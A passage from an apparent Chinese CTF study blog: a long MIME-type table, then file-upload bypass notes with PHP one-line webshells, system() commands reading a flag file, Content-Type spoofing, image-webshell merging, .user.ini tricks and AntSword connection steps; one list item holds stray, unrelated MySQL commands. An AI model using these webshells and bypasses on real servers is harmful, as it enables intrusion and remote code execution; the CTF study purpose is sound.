+&quot;.mpx&quot;&#x3D;&quot;application&#x2F;-project&quot;
+&quot;.mtx&quot;&#x3D;&quot;text&#x2F;xml&quot;
+&quot;.mxp&quot;&#x3D;&quot;application&#x2F;x-mmxp&quot;
+&quot;.net&quot;&#x3D;&quot;image&#x2F;pnetvue&quot;
+&quot;.nrf&quot;&#x3D;&quot;application&#x2F;x-nrf&quot;
+&quot;.nws&quot;&#x3D;&quot;message&#x2F;rfc822&quot;
+&quot;.odc&quot;&#x3D;&quot;text&#x2F;x-ms-odc&quot;
+&quot;.out&quot;&#x3D;&quot;application&#x2F;x-out&quot;
+&quot;.p10&quot;&#x3D;&quot;application&#x2F;pkcs10&quot;
+&quot;.p12&quot;&#x3D;&quot;application&#x2F;x-pkcs12&quot;
+&quot;.p7b&quot;&#x3D;&quot;application&#x2F;x-pkcs7-certificates&quot;
+&quot;.p7c&quot;&#x3D;&quot;application&#x2F;pkcs7-mime&quot;
+&quot;.p7m&quot;&#x3D;&quot;application&#x2F;pkcs7-mime&quot;
+&quot;.p7r&quot;&#x3D;&quot;application&#x2F;x-pkcs7-certreqresp&quot;
+&quot;.p7s&quot;&#x3D;&quot;application&#x2F;pkcs7-signature&quot;
+&quot;.pc5&quot;&#x3D;&quot;application&#x2F;x-pc5&quot;
+&quot;.pci&quot;&#x3D;&quot;application&#x2F;x-pci&quot;
+&quot;.pcl&quot;&#x3D;&quot;application&#x2F;x-pcl&quot;
+&quot;.pcx&quot;&#x3D;&quot;application&#x2F;x-pcx&quot;
+&quot;.pdf&quot;&#x3D;&quot;application&#x2F;pdf&quot;
+&quot;.pdx&quot;&#x3D;&quot;application&#x2F;vnd.adobe.pdx&quot;
+&quot;.pfx&quot;&#x3D;&quot;application&#x2F;x-pkcs12&quot;
+&quot;.pgl&quot;&#x3D;&quot;application&#x2F;x-pgl&quot;
+&quot;.pic&quot;&#x3D;&quot;application&#x2F;x-pic&quot;
+&quot;.pko&quot;&#x3D;&quot;application-pki.pko&quot;
+&quot;.pl&quot;&#x3D;&quot;application&#x2F;x-perl&quot;
+&quot;.plg&quot;&#x3D;&quot;text&#x2F;html&quot;
+&quot;.pls&quot;&#x3D;&quot;audio&#x2F;scpls&quot;
+&quot;.plt&quot;&#x3D;&quot;application&#x2F;x-plt&quot;
+&quot;.png&quot;&#x3D;&quot;image&#x2F;png&quot;
+&quot;.png&quot;&#x3D;&quot;application&#x2F;x-png&quot;
+&quot;.pot&quot;&#x3D;&quot;applications-powerpoint&quot;
+&quot;.ppa&quot;&#x3D;&quot;application&#x2F;vs-powerpoint&quot;
+&quot;.ppm&quot;&#x3D;&quot;application&#x2F;x-ppm&quot;
+&quot;.pps&quot;&#x3D;&quot;application-powerpoint&quot;
+&quot;.ppt&quot;&#x3D;&quot;applications-powerpoint&quot;
+&quot;.ppt&quot;&#x3D;&quot;application&#x2F;x-ppt&quot;
+&quot;.pr&quot;&#x3D;&quot;application&#x2F;x-pr&quot;
+&quot;.prf&quot;&#x3D;&quot;application&#x2F;pics-rules&quot;
+&quot;.prn&quot;&#x3D;&quot;application&#x2F;x-prn&quot;
+&quot;.prt&quot;&#x3D;&quot;application&#x2F;x-prt&quot;
+&quot;.ps&quot;&#x3D;&quot;application&#x2F;x-ps&quot;
+&quot;.ps&quot;&#x3D;&quot;application&#x2F;postscript&quot;
+&quot;.ptn&quot;&#x3D;&quot;application&#x2F;x-ptn&quot;
+&quot;.pwz&quot;&#x3D;&quot;application&#x2F;powerpoint&quot;
+&quot;.r3t&quot;&#x3D;&quot;text&#x2F;vnd.rn-realtext3d&quot;
+&quot;.ra&quot;&#x3D;&quot;audio&#x2F;vnd.rn-realaudio&quot;
+&quot;.ram&quot;&#x3D;&quot;audio&#x2F;x-pn-realaudio&quot;
+&quot;.ras&quot;&#x3D;&quot;application&#x2F;x-ras&quot;
+&quot;.rat&quot;&#x3D;&quot;application&#x2F;rat-file&quot;
+&quot;.rdf&quot;&#x3D;&quot;text&#x2F;xml&quot;
+&quot;.rec&quot;&#x3D;&quot;application&#x2F;vnd.rn-recording&quot;
+&quot;.red&quot;&#x3D;&quot;application&#x2F;x-red&quot;
+&quot;.rgb&quot;&#x3D;&quot;application&#x2F;x-rgb&quot;
+&quot;.rjs&quot;&#x3D;&quot;application&#x2F;vnd.rn-realsystem-rjs&quot;
+&quot;.rjt&quot;&#x3D;&quot;application&#x2F;vnd.rn-realsystem-rjt&quot;
+&quot;.rlc&quot;&#x3D;&quot;application&#x2F;x-rlc&quot;
+&quot;.rle&quot;&#x3D;&quot;application&#x2F;x-rle&quot;
+&quot;.rm&quot;&#x3D;&quot;application&#x2F;vnd.rn-realmedia&quot;
+&quot;.rmf&quot;&#x3D;&quot;application&#x2F;vnd.adobe.rmf&quot;
+&quot;.rmi&quot;&#x3D;&quot;audio&#x2F;mid&quot;
+&quot;.rmj&quot;&#x3D;&quot;application&#x2F;vnd.rn-realsystem-rmj&quot;
+&quot;.rmm&quot;&#x3D;&quot;audio&#x2F;x-pn-realaudio&quot;
+&quot;.rmp&quot;&#x3D;&quot;application&#x2F;vnd.rn-rn_music_package&quot;
+&quot;.rms&quot;&#x3D;&quot;application&#x2F;vnd.rn-realmedia-secure&quot;
+&quot;.rmvb&quot;&#x3D;&quot;application&#x2F;vnd.rn-realmedia-vbr&quot;
+&quot;.rmx&quot;&#x3D;&quot;application&#x2F;vnd.rn-realsystem-rmx&quot;
+&quot;.rnx&quot;&#x3D;&quot;application&#x2F;vnd.rn-realplayer&quot;
+&quot;.rp&quot;&#x3D;&quot;image&#x2F;vnd.rn-realpix&quot;
+&quot;.rpm&quot;&#x3D;&quot;audio&#x2F;x-pn-realaudio-plugin&quot;
+&quot;.rsml&quot;&#x3D;&quot;application&#x2F;vnd.rn-rsml&quot;
+&quot;.rt&quot;&#x3D;&quot;text&#x2F;vnd.rn-realtext&quot;
+&quot;.rtf&quot;&#x3D;&quot;application&#x2F;msword&quot;
+&quot;.rtf&quot;&#x3D;&quot;application&#x2F;x-rtf&quot;
+&quot;.rv&quot;&#x3D;&quot;video&#x2F;vnd.rn-realvideo&quot;
+&quot;.sam&quot;&#x3D;&quot;application&#x2F;x-sam&quot;
+&quot;.sat&quot;&#x3D;&quot;application&#x2F;x-sat&quot;
+&quot;.sdp&quot;&#x3D;&quot;application&#x2F;sdp&quot;
+&quot;.sdw&quot;&#x3D;&quot;application&#x2F;x-sdw&quot;
+&quot;.sit&quot;&#x3D;&quot;application&#x2F;x-stuffit&quot;
+&quot;.slb&quot;&#x3D;&quot;application&#x2F;x-slb&quot;
+&quot;.sld&quot;&#x3D;&quot;application&#x2F;x-sld&quot;
+&quot;.slk&quot;&#x3D;&quot;drawing&#x2F;x-slk&quot;
+&quot;.smi&quot;&#x3D;&quot;application&#x2F;smil&quot;
+&quot;.smil&quot;&#x3D;&quot;application&#x2F;smil&quot;
+&quot;.smk&quot;&#x3D;&quot;application&#x2F;x-smk&quot;
+&quot;.snd&quot;&#x3D;&quot;audio&#x2F;basic&quot;
+&quot;.sol&quot;&#x3D;&quot;text&#x2F;plain&quot;
+&quot;.sor&quot;&#x3D;&quot;text&#x2F;plain&quot;
+&quot;.spc&quot;&#x3D;&quot;application&#x2F;x-pkcs7-certificates&quot;
+&quot;.spl&quot;&#x3D;&quot;application&#x2F;futuresplash&quot;
+&quot;.spp&quot;&#x3D;&quot;text&#x2F;xml&quot;
+&quot;.ssm&quot;&#x3D;&quot;application&#x2F;streamingmedia&quot;
+&quot;.sst&quot;&#x3D;&quot;application-pki.certstore&quot;
+&quot;.stl&quot;&#x3D;&quot;application&#x2F;-pki.stl&quot;
+&quot;.stm&quot;&#x3D;&quot;text&#x2F;html&quot;
+&quot;.sty&quot;&#x3D;&quot;application&#x2F;x-sty&quot;
+&quot;.svg&quot;&#x3D;&quot;text&#x2F;xml&quot;
+&quot;.swf&quot;&#x3D;&quot;application&#x2F;x-shockwave-flash&quot;
+&quot;.tdf&quot;&#x3D;&quot;application&#x2F;x-tdf&quot;
+&quot;.tg4&quot;&#x3D;&quot;application&#x2F;x-tg4&quot;
+&quot;.tga&quot;&#x3D;&quot;application&#x2F;x-tga&quot;
+&quot;.tif&quot;&#x3D;&quot;image&#x2F;tiff&quot;
+&quot;.tif&quot;&#x3D;&quot;application&#x2F;x-tif&quot;
+&quot;.tiff&quot;&#x3D;&quot;image&#x2F;tiff&quot;
+&quot;.tld&quot;&#x3D;&quot;text&#x2F;xml&quot;
+&quot;.top&quot;&#x3D;&quot;drawing&#x2F;x-top&quot;
+&quot;.torrent&quot;&#x3D;&quot;application&#x2F;x-bittorrent&quot;
+&quot;.tsd&quot;&#x3D;&quot;text&#x2F;xml&quot;
+&quot;.txt&quot;&#x3D;&quot;text&#x2F;plain&quot;
+&quot;.uin&quot;&#x3D;&quot;application&#x2F;x-icq&quot;
+&quot;.uls&quot;&#x3D;&quot;text&#x2F;iuls&quot;
+&quot;.vcf&quot;&#x3D;&quot;text&#x2F;x-vcard&quot;
+&quot;.vda&quot;&#x3D;&quot;application&#x2F;x-vda&quot;
+&quot;.vdx&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;
+&quot;.vml&quot;&#x3D;&quot;text&#x2F;xml&quot;
+&quot;.vpg&quot;&#x3D;&quot;application&#x2F;x-vpeg005&quot;
+&quot;.vsd&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;
+&quot;.vsd&quot;&#x3D;&quot;application&#x2F;x-vsd&quot;
+&quot;.vss&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;
+&quot;.vst&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;
+&quot;.vst&quot;&#x3D;&quot;application&#x2F;x-vst&quot;
+&quot;.vsw&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;
+&quot;.vsx&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;
+&quot;.vtx&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;
+&quot;.vxml&quot;&#x3D;&quot;text&#x2F;xml&quot;
+&quot;.wav&quot;&#x3D;&quot;audio&#x2F;wav&quot;
+&quot;.wax&quot;&#x3D;&quot;audio&#x2F;x-ms-wax&quot;
+&quot;.wb1&quot;&#x3D;&quot;application&#x2F;x-wb1&quot;
+&quot;.wb2&quot;&#x3D;&quot;application&#x2F;x-wb2&quot;
+&quot;.wb3&quot;&#x3D;&quot;application&#x2F;x-wb3&quot;
+&quot;.wbmp&quot;&#x3D;&quot;image&#x2F;vnd.wap.wbmp&quot;
+&quot;.wiz&quot;&#x3D;&quot;application&#x2F;msword&quot;
+&quot;.wk3&quot;&#x3D;&quot;application&#x2F;x-wk3&quot;
+&quot;.wk4&quot;&#x3D;&quot;application&#x2F;x-wk4&quot;
+&quot;.wkq&quot;&#x3D;&quot;application&#x2F;x-wkq&quot;
+&quot;.wks&quot;&#x3D;&quot;application&#x2F;x-wks&quot;
+&quot;.wm&quot;&#x3D;&quot;video&#x2F;x-ms-wm&quot;
+&quot;.wma&quot;&#x3D;&quot;audio&#x2F;x-ms-wma&quot;
+&quot;.wmd&quot;&#x3D;&quot;application&#x2F;x-ms-wmd&quot;
+&quot;.wmf&quot;&#x3D;&quot;application&#x2F;x-wmf&quot;
+&quot;.wml&quot;&#x3D;&quot;text&#x2F;vnd.wap.wml&quot;
+&quot;.wmv&quot;&#x3D;&quot;video&#x2F;x-ms-wmv&quot;
+&quot;.wmx&quot;&#x3D;&quot;video&#x2F;x-ms-wmx&quot;
+&quot;.wmz&quot;&#x3D;&quot;application&#x2F;x-ms-wmz&quot;
+&quot;.wp6&quot;&#x3D;&quot;application&#x2F;x-wp6&quot;
+&quot;.wpd&quot;&#x3D;&quot;application&#x2F;x-wpd&quot;
+&quot;.wpg&quot;&#x3D;&quot;application&#x2F;x-wpg&quot;
+&quot;.wpl&quot;&#x3D;&quot;application&#x2F;-wpl&quot;
+&quot;.wq1&quot;&#x3D;&quot;application&#x2F;x-wq1&quot;
+&quot;.wr1&quot;&#x3D;&quot;application&#x2F;x-wr1&quot;
+&quot;.wri&quot;&#x3D;&quot;application&#x2F;x-wri&quot;
+&quot;.wrk&quot;&#x3D;&quot;application&#x2F;x-wrk&quot;
+&quot;.ws&quot;&#x3D;&quot;application&#x2F;x-ws&quot;
+&quot;.ws2&quot;&#x3D;&quot;application&#x2F;x-ws&quot;
+&quot;.wsc&quot;&#x3D;&quot;text&#x2F;scriptlet&quot;
+&quot;.wsdl&quot;&#x3D;&quot;text&#x2F;xml&quot;
+&quot;.wvx&quot;&#x3D;&quot;video&#x2F;x-ms-wvx&quot;
+&quot;.xdp&quot;&#x3D;&quot;application&#x2F;vnd.adobe.xdp&quot;
+&quot;.xdr&quot;&#x3D;&quot;text&#x2F;xml&quot;
+&quot;.xfd&quot;&#x3D;&quot;application&#x2F;vnd.adobe.xfd&quot;
+&quot;.xfdf&quot;&#x3D;&quot;application&#x2F;vnd.adobe.xfdf&quot;
+&quot;.xhtml&quot;&#x3D;&quot;text&#x2F;html&quot;
+&quot;.xls&quot;&#x3D;&quot;application&#x2F;-excel&quot;
+&quot;.xls&quot;&#x3D;&quot;application&#x2F;x-xls&quot;
+&quot;.xlw&quot;&#x3D;&quot;application&#x2F;x-xlw&quot;
+&quot;.xml&quot;&#x3D;&quot;text&#x2F;xml&quot;
+&quot;.xpl&quot;&#x3D;&quot;audio&#x2F;scpls&quot;
+&quot;.xq&quot;&#x3D;&quot;text&#x2F;xml&quot;
+&quot;.xql&quot;&#x3D;&quot;text&#x2F;xml&quot;
+&quot;.xquery&quot;&#x3D;&quot;text&#x2F;xml&quot;
+&quot;.xsd&quot;&#x3D;&quot;text&#x2F;xml&quot;
+&quot;.xsl&quot;&#x3D;&quot;text&#x2F;xml&quot;
+&quot;.xslt&quot;&#x3D;&quot;text&#x2F;xml&quot;
+&quot;.xwd&quot;&#x3D;&quot;application&#x2F;x-xwd&quot;
+&quot;.x_b&quot;&#x3D;&quot;application&#x2F;x-x_b&quot;
+&quot;.x_t&quot;&#x3D;&quot;application&#x2F;x-x_t&quot;
+Office2007对应的值:
+&quot;application&#x2F;vnd.openxmlformats-officedocument.wordprocessingml.template&quot; (for .docx files)
+&quot;application&#x2F;vnd.openxmlformats-officedocument.presentationml.presentation&quot; (for .pptx files)
+&quot;application&#x2F;vnd.openxmlformats-officedocument.presentationml.slideshow&quot; (for .ppsx files)
+&quot;application&#x2F;vnd.openxmlformats-officedocument.presentationml.template&quot; (for .potx files)
+&quot;application&#x2F;vnd.openxmlformats-officedocument.spreadsheetml.sheet&quot; (for .xlsx files)
+&quot;application&#x2F;vnd.openxmlformats-officedocument.spreadsheetml.template&quot; (for .xltx files)
+相对于Office2003是这样的
+Response.ContentType &#x3D; &quot;application&#x2F;vnd.ms-excel&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h2 id="最常用的马"><a href="#最常用的马" class="headerlink" title="最常用的马"></a>最常用的马</h2><pre class="line-numbers language-none"><code class="language-none">&lt;?php phpinfo(); @eval($_POST[&#39;shell&#39;]); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<ol>
+<li>这样写的目的是有phpinfo()的回显，如果显示了<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717003904.png">的回显，则为能够解析木马，否则不能解析<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3></li>
+<li>system函数用于执行外部程序，并且<strong>显示输出</strong><pre class="line-numbers language-none"><code class="language-none">system(string $command,int &amp;$return_var&#x3D;?):string<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>返回值为可选的，可以省略</li>
+<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716122452.png"></li>
+</ol>
+<h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><ol>
+<li>eval()函数把字符串按照PHP代码来计算</li>
+<li>该字符串必须是合法的PHP代码，以分号结尾</li>
+<li>eval()内部写的是php代码，而system()函数内部写的是命令</li>
+<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716124148.png"></li>
+</ol>
+<h3 id="tac-cat"><a href="#tac-cat" class="headerlink" title="tac/cat"></a>tac/cat</h3><ol>
+<li>用来显示文件，tac是反向（向前）的顺序列出文件的内容,tac最重要的作用是对HTML的注释内容进行破坏，从而使注释内容不需要查看源代码即可回显到主页面</li>
+<li>cat是读取其后所指文件内容并将其输出到标准输出设备上</li>
+</ol>
+<h3 id="-1"><a href="#-1" class="headerlink" title="@"></a>@</h3><ol>
+<li>xxxxxxxxxx14 1（1）登录2mysql -u root –p3（2）创建新用户4create user ‘hadming‘@’%’ identified by ‘123456’;5（3）为用户授权6mysql&gt; grant all on <em>.</em> to ‘hadming‘@’%’;7（4）创建数据库8create database hadoopDB;9（5）查看数据库10show databases;11(6)选择数据库12Use hadoopDB13(7)删除数据库14（8）创建表bash</li>
+<li>屏蔽了出错文件的路径等信息，安全性高，但是就没有回显了，所以可以不加@来获取到更多的回显信息</li>
+</ol>
+<h3 id="array-pop"><a href="#array-pop" class="headerlink" title="array_pop()"></a>array_pop()</h3><ol>
+<li>可以接受一个post或者get传的参数,这样就可以绕过过滤掉中括号和大括号无法使用$_POST[‘shell’]的情况<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;eval(array_pop($POST));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ol>
+<h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717152902.png"></p>
+<h3 id="js前端过滤，ctfshow"><a href="#js前端过滤，ctfshow" class="headerlink" title="js前端过滤，ctfshow"></a>js前端过滤，ctfshow</h3><ol>
+<li>查看网页源代码，查看js，发现前端过滤<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716094646.png"></li>
+<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716094739.png"></li>
+<li>修改前端js，屏蔽过滤<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716094808.png"></li>
+<li>文件可以上传成功<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716094857.png"></li>
+<li>1=system(“ls ./“);在本地找不到东西</li>
+<li>1=system(“ls /“);在根目录下也找不到东西<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716114825.png"></li>
+<li>1=system(“ls ../“);在上级目录找到flag<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716114952.png"></li>
+<li>构造语句1=system(“tac ../flag.php”);看到flag<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716115039.png"></li>
+</ol>
+<h3 id="文件后缀绕过攻击"><a href="#文件后缀绕过攻击" class="headerlink" title="文件后缀绕过攻击"></a>文件后缀绕过攻击</h3><ol>
+<li>服务端代码中限制了某些后缀的文件不允许上传，但是有些apache是允许解析其它文件后缀的</li>
+<li>在apache的解析顺序中，是从右到左开始解析文件后缀的，如果最右侧的拓展名不能识别，就继续向左判断，直到遇到可以解析的文件后缀为止</li>
+<li>例如：1.php.xxxx，xxxx不能解析，所以向左解析后缀php</li>
+<li>或者可以大写一个字母，绕过弱过滤，例如php写为phP,大写一个字母</li>
+<li>简单来说，文件上传检测的是最右侧的文件后缀名，但是apache从右到左解析，遇到右侧不能解析的文件名会跳过，知道能够解析的位置</li>
+</ol>
+<h3 id="文件类型绕过攻击-后端不能单一校验"><a href="#文件类型绕过攻击-后端不能单一校验" class="headerlink" title="文件类型绕过攻击,后端不能单一校验"></a>文件类型绕过攻击,后端不能单一校验</h3><ol>
+<li>在客户端上传文件时，通过burp抓包，当上传一个php格式的文件时，和上传一个jpg格式的<strong>Content-type不一致</strong></li>
+<li>如果<strong>服务端</strong>是<strong>通过Content-type来判断</strong>文件的类型，就存在被绕过的可能，因为Content-type的值是<strong>客户端传递的</strong>，是<strong>可以任意修改的</strong></li>
+<li>所以上传一个php文件格式时，在burp中修改<strong>Content-type</strong>的值为image/jpeg，就可以绕过后端的检测</li>
+</ol>
+<h4 id="使用-FLIES-“file”-“type”-后端过滤"><a href="#使用-FLIES-“file”-“type”-后端过滤" class="headerlink" title="使用$_FLIES[“file”][“type”]后端过滤"></a>使用$_FLIES[“file”][“type”]后端过滤</h4><ol>
+<li>$_FILES[“file”][“type”]是客户端请求数据包中的Contant-type,可以通过修改Contant-type来绕过</li>
+<li>ctfshow例题152</li>
+<li>直接上传，发现<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716165636.png"></li>
+<li>上来先找js有没有前端过滤，发现js有前端过滤，修改为php<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716115444.png"></li>
+<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716115448.png">还是不能够上传，应该就是后端有过滤了</li>
+<li>抓个包，首先看看是不是文件名后缀的问题，<strong>大写一个字母</strong>，例如phP，发现还是被过滤掉了</li>
+<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716115845.png">，<strong>修改文件的Content-type</strong>,和前端所要求的文件类型一致，为image/png<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716120958.png">,就可以上传成功了<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716121004.png"></li>
+</ol>
+<h5 id="方法2：用蚁剑去连接"><a href="#方法2：用蚁剑去连接" class="headerlink" title="方法2：用蚁剑去连接"></a>方法2：用蚁剑去连接</h5><ol>
+<li>绕过前端js过滤，后端改包之后能够上传</li>
+<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717004035.png"></li>
+<li>用蚁剑去连接，右键点击添加数据，url里面填url加上上传马的路径（马所在的位置），密码为post传的参数，即shell<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717004227.png">，如果出现连接成功则为ok</li>
+<li>在上传文件管理器中单机右键，选择在此处打开终端<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717004350.png"></li>
+<li>一级一级目录地去寻找flag，<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717004304.png"></li>
+</ol>
+<h4 id="使用getimagesize-后端过滤"><a href="#使用getimagesize-后端过滤" class="headerlink" title="使用getimagesize()后端过滤"></a>使用getimagesize()后端过滤</h4><ol>
+<li>getimagesize()可以获取到图片的宽高，如果上传的不是图片文件，getimagesize()就获取不到信息，返回false，取反!getimagesize()就为true<pre class="line-numbers language-none"><code class="language-none">if(!getimagesize($_FILES[&quot;file&quot;][&quot;type_name&quot;]))&#123;
+    exit();  &#x2F;&#x2F;不满足就退出
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
+<li>此时可以将一个图片和一个webshell合并为一个文件<pre class="line-numbers language-none"><code class="language-none">cat image.png webshell.php&gt;image.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>也可以用010editor放到最后</li>
+</ol>
+<h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><ol>
+<li>上传.user.ini进行文件上传绕过</li>
+<li>一定注意这是一个隐藏配置文件，最前面要加点，是”.user.ini”</li>
+</ol>
+<h5 id="user-ini文件-常用配置项"><a href="#user-ini文件-常用配置项" class="headerlink" title=".user.ini文件,常用配置项"></a>.user.ini文件,常用配置项</h5><ol>
+<li>php支持基于每个目录的.ini文件配置</li>
+<li>除了主php.ini文件之外，php还会在每个目录下扫描ini文件，从被执行的php文件所在目录开始，一直上升到web根目录，（$_SERVER[‘DOCUMENT_ROOT’]所指定的），如果被执行的php文件在web根目录之外，则只扫描该目录</li>
+<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717011205.png"></li>
+<li>常用配置项：S<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717011252.png"></li>
+<li>假设包含1.txt<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717011331.png">,重命名为.user.ini</li>
+</ol>
+<h3 id="对文件内容过滤"><a href="#对文件内容过滤" class="headerlink" title="对文件内容过滤"></a>对文件内容过滤</h3><h4 id="常用绕过方法"><a href="#常用绕过方法" class="headerlink" title="常用绕过方法"></a>常用绕过方法</h4><ol>
+<li>绕过php：短标签：<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D; ?&gt;代替php标签，&lt;?&#x3D; ?&gt;标签可以直接把php的结果输出，&lt;?&#x3D; ?&gt;的结果和&lt;?php ?&gt;完全一样<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>绕过空格：使用转义字符绕过’\t’;或者使用%09也是tab的URL编码，php反引号中的字符串会被当作命令执行</li>
+<li>绕过[]:使用{}即可，大括号和中括号的作用在php中等价<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717120017.png"></li>
+<li>绕过[]和{}:使用array_pop()函数，函数内部写传参的方式，例如：array_pop($_POST);<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717150830.png">，以字符串的形式返回执行的语句<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717151007.png">，可以配合eval()函数使用</li>
+<li>绕过分号;:最后一句的分号可以不要，且可以使用?&gt;去绕过分号</li>
+</ol>
+<h4 id="不允许使用php字样，使用短标签绕过，例题：ctfshow154-ctfshow155"><a href="#不允许使用php字样，使用短标签绕过，例题：ctfshow154-ctfshow155" class="headerlink" title="不允许使用php字样，使用短标签绕过，例题：ctfshow154,ctfshow155"></a>不允许使用php字样，使用短标签绕过，例题：ctfshow154,ctfshow155</h4><ol>
+<li>上传一个png文件，抓包</li>
+<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717111434.png"></li>
+<li>改包，改上传文件名称为’.user.ini’,文件内容采用’auto_append_file=1.txt’;</li>
+<li>直接上传一个1.txt文件，内容为简单的一句话木马发现报错<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717111650.png"></li>
+<li>直接上传一个内容为php的，前端为png的文件内容，发现还是报错，二分法判断前和后哪里的问题，发现是后面不允许使用php字样</li>
+<li>使用短标签不适用’php’字样,发现可以上传<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717112101.png"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
